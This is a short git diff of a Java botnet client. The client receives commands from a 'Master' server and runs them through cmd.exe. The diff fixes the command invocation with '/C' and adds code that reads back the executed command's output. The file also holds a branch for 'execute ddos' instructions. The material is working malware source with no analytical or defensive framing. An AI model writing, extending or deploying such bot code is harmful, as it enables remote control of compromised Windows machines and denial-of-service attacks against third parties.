@@ -51,14 +51,19 @@ public class Client {
 			while(true) {
 				try {
 					String command = (String) sInput.readObject();
+					System.out.println("INFO: Received command from Master");
 					command = command.replaceAll("COMMAND: ", "");
 					if(command.startsWith("execute") && !command.contains("ddos")) {
 						command = command.replaceAll("execute ", "");
 						System.out.println("INFO: Executing command: " + command);
-						ProcessBuilder ps = new ProcessBuilder("cmd.exe", command);
-						ps.redirectErrorStream(true);
+						ProcessBuilder ps = new ProcessBuilder("cmd.exe", "/C " + command).redirectErrorStream(true);
 						Process pr = ps.start();
-						pr.waitFor();
+						BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
+						String line;
+						while((line = in.readLine()) != null) {
+						    System.out.println(line);
+						}
+						//pr.waitFor(); //Might not need this line, removing until problems arise
 					}else if(command.startsWith("execute ddos")) {
 						System.out.println("INFO: DDOS instruction recieved");
 						command = command.replaceAll("execute ", "");
